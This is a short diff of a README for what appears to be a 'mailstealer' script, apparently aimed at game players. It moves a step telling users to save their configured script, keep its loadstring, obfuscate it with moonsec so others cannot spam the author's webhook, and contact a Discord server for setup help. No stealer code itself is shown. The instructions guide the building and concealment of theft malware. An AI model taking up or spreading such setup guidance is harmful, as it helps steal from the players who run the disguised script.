@@ -84,8 +84,6 @@ If you dont want key system
 Just set it to false `keySystemEnabled = false`  
 Or remove everything related to it (keySystemEnabled, hubName, keyLink, keys !!!!DO NOT TOUCH THE LOADSTRING!!!!)  
 I think you can figure rest of the stuff out  
-now after doing everything you save your script to a file call it mailsetaler.txt and save it somewhere(using notepad or a file editor) then go to step 3(part2)  
-Make sure to [DM](https://discord.gg/Eh7EX6dzAF) me if you cant follow something  I'll help you   
   
 use https://enivzoy.github.io/Aurora/ to generate your script for better user interface
   
@@ -136,6 +134,9 @@ continue following step 3 : obfuscation & uploading
   
 </details>   
   
+now after doing everything you save your script to a file call it mailsetaler.txt and save it somewhere(using notepad or a file editor) then go to step 3(part2)  
+Make sure to [DM](https://discord.gg/Eh7EX6dzAF) me(aurora or raptured) if you cant follow something  I'll help you   
+
 # 3: obfuscation & uploading
 Now you gotta obfuscate your bot so people don't spam your webhook  
 I'll be showing you how to use moonsec in this tutorial  
